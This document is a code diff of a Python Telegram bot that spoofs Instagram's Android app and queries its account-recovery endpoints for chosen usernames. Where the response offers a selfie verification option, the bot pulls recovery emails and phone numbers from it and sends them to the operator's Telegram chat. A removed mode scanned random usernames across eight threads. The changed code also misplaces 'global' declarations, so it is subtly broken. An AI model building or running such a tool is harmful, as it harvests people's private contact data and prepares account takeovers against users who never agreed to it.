@@ -3,48 +3,41 @@ import json
 import re
 import uuid
 import random
-import requests
-import threading
+import string
 import time
+import threading
+import requests
 from http.server import BaseHTTPRequestHandler
 
-# ====================== CONFIG ======================
+# ====================== ENVIRONMENT VARIABLES ======================
 TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
 if not TOKEN or not CHAT_ID:
-    raise Exception("BOT_TOKEN and CHAT_ID must be set in Vercel!")
+    raise Exception("Set BOT_TOKEN and CHAT_ID in Vercel Environment Variables!")
 
 # ====================== GLOBALS ======================
-hads = 0
-bad = 0
-erore = 0
+hads = bad = erore = 0
 checked = set()
 lock = threading.Lock()
 
-def check_one(username, chat_id=None):
-    global hads, bad, erore   # ← Fixed: global at the top
-    
-    username = username.strip().lstrip('@').lower()
-    if not username:
-        return
+# ====================== ORIGINAL CHECK FUNCTION ======================
+def check_one(user):
+    global hads, bad, erore
+    user = user.strip().lstrip('@').lower()
 
     with lock:
-        if username in checked:
-            if chat_id:
-                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                            json={"chat_id": chat_id, "text": f"✅ @{username} already checked."})
+        if user in checked:
             return
-        checked.add(username)
+        checked.add(user)
 
     try:
-        if chat_id:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                        json={"chat_id": chat_id, "text": f"🔍 Checking @{username}..."})
-
         sess = requests.Session()
+        random_hex = ''.join(random.choices('0123456789abcdef', k=16))
+        ig_device_id = f"android-{random_hex}"
         device_id = str(uuid.uuid4())
+        family_device_id = str(uuid.uuid4())
+        machine_id = f"acgidwABAAG{''.join(random.choices('0123456789abcdef', k=16))}"
 
         headers = {
             'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
@@ -52,16 +45,24 @@ def check_one(username, chat_id=None):
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'x-ig-app-id': '567067343352427',
             'x-ig-device-id': device_id,
+            'x-ig-family-device-id': family_device_id,
+            'x-ig-android-id': ig_device_id,
+        }
+
+        aac_object = {
+            "aac_init_timestamp": int(time.time()),
+            "aacjid": str(uuid.uuid4()),
+            "aaccs": ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=43))
         }
 
         data = {
-            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{username}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
+            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{user}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
             'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
             'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
         }
 
         res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
-                        headers=headers, data=data, timeout=15)
+                        headers=headers, data=data, timeout=12)
 
         if res1.status_code == 200:
             match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
@@ -73,44 +74,35 @@ def check_one(username, chat_id=None):
                     data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                           'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                           'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
-                    timeout=15
+                    timeout=12
                 ).text
 
                 if 'SELFIE' in res2.upper():
                     with lock:
+                        global hads
                         hads += 1
                     emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                     phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
-                    msg = f"🎯 **SELFIE FOUND!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
+                    msg = f"🎯 **SELFIE HIT**\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": CHAT_ID, "text": msg})
                 else:
                     with lock:
+                        global bad
                         bad += 1
-                    if chat_id:
-                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                                    json={"chat_id": chat_id, "text": f"❌ @{username} → No Selfie"})
             else:
                 with lock:
+                    global bad
                     bad += 1
         else:
             with lock:
+                global erore
                 erore += 1
 
     except:
         with lock:
+            global erore
             erore += 1
-        if chat_id:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                        json={"chat_id": chat_id, "text": f"⚠️ Error on @{username}"})
-
-
-def random_check():
-    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
-    while True:
-        user = ''.join(random.choices(chars, k=random.randint(4,6)))
-        check_one(user)
-        time.sleep(1.8)
 
 
 class handler(BaseHTTPRequestHandler):
@@ -121,21 +113,16 @@ class handler(BaseHTTPRequestHandler):
             data = json.loads(post_data)
 
             if 'message' in data:
-                msg = data['message']
-                text = msg.get('text', '')
-                chat_id = msg['chat']['id']
+                text = data['message'].get('text', '')
+                chat_id = data['message']['chat']['id']
 
                 if text.startswith('/check '):
                     username = text.split(maxsplit=1)[1]
-                    threading.Thread(target=check_one, args=(username, chat_id), daemon=True).start()
-
-                elif text.startswith('/start'):
-                    for _ in range(8):
-                        threading.Thread(target=random_check, daemon=True).start()
-                    self.reply(chat_id, "🚀 Random mode started!")
+                    threading.Thread(target=check_one, args=(username,), daemon=True).start()
+                    self.reply(chat_id, f"🔍 Checking @{username}...")
 
                 elif text.startswith('/stats'):
-                    self.reply(chat_id, f"📊 Stats:\n✅ Selfie: {hads}\n❌ Bad: {bad}\n⚠️ Error: {erore}")
+                    self.reply(chat_id, f"Selfie: {hads}\nBad: {bad}\nError: {erore}")
 
         except:
             pass
@@ -148,9 +135,10 @@ class handler(BaseHTTPRequestHandler):
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      json={"chat_id": chat_id, "text": text})
 
-# Set webhook
-if WEBHOOK_URL:
+
+# Auto set webhook (once)
+if os.getenv("WEBHOOK_URL"):
     try:
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={WEBHOOK_URL}")
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={os.getenv('WEBHOOK_URL')}")
     except:
         pass
